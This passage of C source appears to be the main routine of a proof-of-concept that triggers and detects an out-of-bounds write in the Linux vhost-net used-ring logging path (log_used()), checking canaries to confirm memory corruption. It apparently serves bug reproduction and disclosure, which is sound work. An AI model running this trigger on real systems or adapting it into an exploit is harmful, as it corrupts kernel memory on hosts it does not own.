                            (1ULL << VIRTIO_F_IN_ORDER) |
                            (1ULL << VHOST_F_LOG_ALL);
        if ((feats & required) != required)
            DIE("kernel did not offer required features (missing 0x%llx of "
                "IN_ORDER|LOG_ALL|V1); cannot reproduce here -- this is NOT "
                "evidence the bug is absent\n",
                (unsigned long long)(required & ~feats));
    }
    if (xioctl(vfd, VHOST_SET_FEATURES, &feats, "SET_FEATURES") < 0) DIE("SET_FEATURES\n");

    vmem = calloc(1, sizeof(*vmem) + sizeof(struct vhost_memory_region));
    vmem->nregions = 1;
    vmem->regions[0].guest_phys_addr = 0;
    vmem->regions[0].memory_size     = GUEST_MEM_SZ;
    vmem->regions[0].userspace_addr  = (uint64_t)(uintptr_t)mem;
    if (xioctl(vfd, VHOST_SET_MEM_TABLE, vmem, "SET_MEM_TABLE") < 0) DIE("SET_MEM_TABLE\n");

    /* Must precede NET_SET_BACKEND: attaching the backend runs
     * vhost_vq_access_ok() -> vq_log_access_ok(), which needs log_base set. */
    logbase_arg = (uint64_t)(uintptr_t)logmap;
    if (xioctl(vfd, VHOST_SET_LOG_BASE, &logbase_arg, "SET_LOG_BASE") < 0)
        DIE("SET_LOG_BASE\n");

    vs.index = VQ_TX; vs.num = VRING_NUM;
    if (xioctl(vfd, VHOST_SET_VRING_NUM, &vs, "SET_VRING_NUM(TX)") < 0) DIE("VRING_NUM\n");

    memset(&va, 0, sizeof(va));
    va.index           = VQ_TX;
    va.desc_user_addr  = (uint64_t)(uintptr_t)desc;
    va.avail_user_addr = (uint64_t)(uintptr_t)avail;
    va.used_user_addr  = (uint64_t)(uintptr_t)used;
    va.flags           = (1 << VHOST_VRING_F_LOG);  /* enable used-ring logging */
    va.log_guest_addr  = USED_OFF;                  /* GPA of the used ring     */
    if (xioctl(vfd, VHOST_SET_VRING_ADDR, &va, "SET_VRING_ADDR(TX)") < 0) DIE("VRING_ADDR\n");

    vs.index = VQ_TX; vs.num = 0;
    if (xioctl(vfd, VHOST_SET_VRING_BASE, &vs, "SET_VRING_BASE(TX)") < 0) DIE("VRING_BASE\n");

    g_kickfd = eventfd(0, EFD_NONBLOCK);
    callfd   = eventfd(0, EFD_NONBLOCK);
    vf.index = VQ_TX; vf.fd = g_kickfd;
    if (xioctl(vfd, VHOST_SET_VRING_KICK, &vf, "SET_VRING_KICK(TX)") < 0) DIE("KICK\n");
    vf.index = VQ_TX; vf.fd = callfd;
    if (xioctl(vfd, VHOST_SET_VRING_CALL, &vf, "SET_VRING_CALL(TX)") < 0) DIE("CALL\n");

    vf.index = VQ_TX; vf.fd = tapfd;
    if (xioctl(vfd, VHOST_NET_SET_BACKEND, &vf, "NET_SET_BACKEND(TX)") < 0) DIE("SET_BACKEND\n");
    DBG("vhost-net TX backend attached; ring live\n");

    used_before = used->idx;
    DBG("used->idx before = %u; starting refill writer for %d s\n",
        used_before, RUN_SECONDS);

    /* One refill thread with a private speculative target; a second thread
     * would race on avail->idx.  -smp 4 gives it a dedicated vCPU. */
    if (pthread_create(&wt, NULL, writer_thread, NULL) != 0) DIE("pthread_create\n");
    sleep(RUN_SECONDS);
    g_stop = 1;
    pthread_join(wt, NULL);

    used_after = used->idx;
    DBG("used->idx after = %u (delta=%u)  max_refill_step=%lu  avail_updates=%lu  final_rx=%lu\n",
        used_after, (uint16_t)(used_after - used_before), g_max_avail_lag,
        g_avail_updates, g_final_rx);
    for (i = 0; i < VRING_NUM; i++)
        DBG("used->ring[%d] = {id=%u len=%u}\n", i, used->ring[i].id, used->ring[i].len);

    {
        int corrupted = 0;
        for (i = 0; i < 16; i++)
            if (canary[i] != CANARY_MAGIC) { corrupted = 1; break; }
        if (corrupted) {
            fprintf(stderr, "[poc] *** CANARY CORRUPTED -> OOB write CONFIRMED ***\n");
            hexdump("canary area", canary, 64);
        } else {
            fprintf(stderr, "[poc] canary intact (probe may still have fired; see dmesg)\n");
        }
    }
    {
        int lcorrupt = 0, k;
        for (k = 0; k < LOGBIT_CANARY_SZ; k++)
            if (logmap[LOGBIT_CANARY_OFF + k] != LOGBIT_CANARY_BYTE) { lcorrupt = 1; break; }
        if (lcorrupt) {
            fprintf(stderr, "[poc] *** LOG BITMAP CANARY CORRUPTED -> log_used() OOB write CONFIRMED ***\n");
            hexdump("log bitmap canary", logmap + LOGBIT_CANARY_OFF, LOGBIT_CANARY_SZ);
        } else {
            fprintf(stderr, "[poc] log bitmap canary intact (log_used probe may still have fired; see dmesg)\n");
        }
    }
    fprintf(stderr, "[poc] === check guest dmesg for WARN_ON_ONCE probes ===\n");

    vf.index = VQ_TX; vf.fd = -1;
    ioctl(vfd, VHOST_NET_SET_BACKEND, &vf);
    close(vfd); close(tapfd); close(g_kickfd); close(callfd);
    munmap(mem, GUEST_MEM_SZ);
    munmap(logmap, LOGMAP_SZ);
    return 0;
}
